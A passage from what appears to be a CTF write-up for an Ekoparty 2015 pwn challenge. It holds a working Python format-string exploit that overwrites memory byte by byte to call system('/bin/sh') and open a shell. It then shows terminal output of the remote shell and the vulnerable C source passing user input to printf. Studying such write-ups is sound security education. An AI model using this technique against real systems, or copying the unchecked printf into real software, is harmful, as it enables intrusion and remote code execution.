</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%124$s&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write1</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
</span><span class='line'><span class="c">#       argument 25 contains 0xbffff844,</span>
</span><span class='line'><span class="c">#                               which points to 0xbffff958</span>
</span><span class='line'><span class="c">#       so we can use 25 to modify position 61 to write something on the stack!</span>
</span><span class='line'><span class="c">#       addr = 0xbffff758 # = argument 2</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">where</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># write byte</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">:</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">))</span><span class="o">+</span><span class="s">&quot;c%124$hhn&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">))</span><span class="o">+</span><span class="s">&quot;c%124$hn&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">writebytes</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">what</span><span class="p">)):</span>
</span><span class='line'>      <span class="n">write1</span><span class="p">(</span><span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">where</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="k">global</span> <span class="n">conn</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;challs.ctf.site&#39;</span><span class="p">,</span> <span class="mi">20002</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing /bin/sh to 0x13373008&quot;</span>
</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="mh">0x13373008</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing system() to 0x13372020&quot;</span>
</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xb7e69cd0</span><span class="p">),</span> <span class="mh">0x13372020</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] fucking up strcmp()&quot;</span>
</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1f</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x13372011</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yeah. Pretty horrible.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ekoparty</span><span class="o">-</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn20</span><span class="err">$</span> <span class="n">python</span> <span class="n">pwnpoc</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challs</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">site</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">20002</span><span class="p">:</span> <span class="n">Done</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">writing</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="n">to</span> <span class="mh">0x13373008</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">writing</span> <span class="n">system</span><span class="p">()</span> <span class="n">to</span> <span class="mh">0x13372020</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">fucking</span> <span class="n">up</span> <span class="n">strcmp</span><span class="p">()</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span><span class='line'><span class="err">$</span> <span class="nb">id</span>
</span><span class='line'><span class="err">$</span> <span class="nb">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span>
</span><span class='line'><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">simple</span>
</span><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
</span><span class='line'><span class="n">total</span> <span class="mi">68</span>
</span><span class='line'><span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">2</span> <span class="n">simple</span> <span class="n">simple</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span>   <span class="n">root</span>    <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">12</span> <span class="mi">21</span><span class="p">:</span><span class="mi">10</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">145</span> <span class="n">Sep</span> <span class="mi">12</span> <span class="mi">21</span><span class="p">:</span><span class="mi">13</span> <span class="o">.</span><span class="n">bash_history</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">220</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">bash_logout</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>  <span class="mi">3637</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">bashrc</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">675</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">profile</span>
</span><span class='line'><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">27095</span> <span class="n">Nov</span> <span class="mi">17</span>  <span class="mi">2011</span> <span class="n">checksec</span><span class="o">.</span><span class="n">sh</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>    <span class="mi">35</span> <span class="n">Sep</span> <span class="mi">14</span> <span class="mi">23</span><span class="p">:</span><span class="mi">37</span> <span class="n">flag</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">simple</span>  <span class="mi">1904</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mo">01</span><span class="p">:</span><span class="mi">08</span> <span class="n">fmt_001</span><span class="o">.</span><span class="n">c</span>
</span><span class='line'><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">simple</span>  <span class="mi">5776</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mo">01</span><span class="p">:</span><span class="mi">08</span> <span class="n">greetings</span>
</span><span class='line'><span class="n">Hi</span> <span class="nb">id</span>
</span><span class='line'>
</span><span class='line'><span class="n">OMG</span><span class="err">!</span> <span class="n">nice</span> <span class="n">work</span><span class="p">,</span> <span class="n">your</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="o">^</span>\<span class="n">x10LnBye</span><span class="err">!</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include  &lt;signal.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">mkey</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">mkey_crypt</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf</span><span class="s">&quot;</span> <span class="p">};</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">fmt</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x71\x73\x27\x1f\x1d\x48\x47</span><span class="s">&quot;</span> <span class="p">};</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b</span><span class="s">&quot;</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="nf">decrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">len_key</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">len_msg</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">len_key</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WTF no memory :s&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_msg</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len_msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">len_key</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">num</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&lt;Simple loop greetings v1.3.3.7&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;[!] Type bye to quit&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">alarm</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter your name: &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
</span><span class='line'>        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;bye&quot;</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;%n&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;%N&quot;</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="c1">//p: %s\n&quot;, buff);</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hi &quot;</span><span class="p">);</span><span class="n">printf</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&quot;Welcome to ekoparty 2015!&quot;</span><span class="p">,</span> <span class="n">buff</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
